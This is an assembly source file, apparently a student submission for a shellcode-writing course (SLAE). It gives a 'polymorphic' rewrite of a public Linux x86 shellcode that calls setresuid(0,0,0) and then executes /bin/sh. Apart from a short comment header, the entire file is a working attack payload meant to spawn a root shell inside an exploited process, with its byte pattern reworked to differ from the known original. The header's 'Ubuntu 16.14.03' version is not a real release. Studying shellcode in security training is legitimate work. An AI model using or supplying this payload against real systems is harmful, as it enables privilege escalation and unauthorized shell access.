; SLAE - Assignment #6: Polymorphic version of existing shellcode (Linux/x86)
; Source : http://shell-storm.org/shellcode/files/shellcode-220.php
; Source Shellcode : linux x86 setresuid(0,0,0)-/bin/sh shellcode 35 bytes
; Polymorphic version 36 bytes
; Author: Alain Menelet 
; StudentID - PA-3763
; Tested on Ubuntu 16.14.03 LTS

global _start

section .text

_start:

    ;setresuid(0,0,0)

    xor ecx, ecx
    mul ecx
    mov ebx, ecx
    cdq
    mov al, 0xa4
    int 0x80

    ;execve("/bin//sh", ["/bin//sh", NULL], [NULL])

    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push ecx
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 0xb
    int 0x80